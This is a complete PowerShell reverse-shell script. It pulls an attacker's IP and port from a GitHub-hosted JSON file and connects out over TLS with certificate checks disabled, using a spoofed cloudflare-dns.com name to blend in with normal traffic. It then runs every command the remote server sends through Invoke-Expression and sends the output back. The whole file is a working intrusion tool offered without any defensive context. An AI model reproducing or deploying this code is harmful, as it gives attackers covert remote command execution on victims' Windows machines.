function DNSLookup($DNSRecord){
    $response = (Invoke-WebRequest ('https://1.1.1.1/dns-query?name=powershell-reverse-shell.demo.example.com&type=' + $DNSRecord) -Headers @{'accept' = 'application/dns-json'}).content
    return ([System.Text.Encoding]::UTF8.GetString($response)|ConvertFrom-Json).Answer.data.trim('"')
}

$j = Invoke-RestMethod -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/ip_port.json"

$remoteIP = $j.IP
$remotePort = $j.PORT

do {
    Start-Sleep -Seconds 1
    try{
        $TCPConnection = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
    }catch{}
} until ($TCPConnection.Connected)


$NetworkStream = $TCPConnection.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($NetworkStream, $false, ({$true} -as [System.Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $false)

if (!$sslStream.IsAuthenticated -or !$sslStream.IsSigned) {
    $sslStream.Close()
    exit
}


$streamWriter = New-Object System.IO.StreamWriter($sslStream)

function writeStreamToServer($string){
    [byte[]]$script:buffer = 0..$TCPConnection.ReceiveBufferSize | % {0}
    $streamWriter.Write($string + 'SHELL '+(Get-Location).Path +' :>')
    $streamWriter.Flush()
}

writeStreamToServer ''

while (($bytesRead = $sslStream.Read($script:buffer, 0, $script:buffer.Length)) -gt 0) {

    $command = [System.Text.Encoding]::UTF8.GetString($script:buffer, 0, $bytesRead - 1)

    $command_output = try {
        Invoke-Expression $command 2>&1 | Out-String
    }
    catch {
        $_ | Out-String
    }
    writeStreamToServer($command_output)
}

$streamWriter.Close()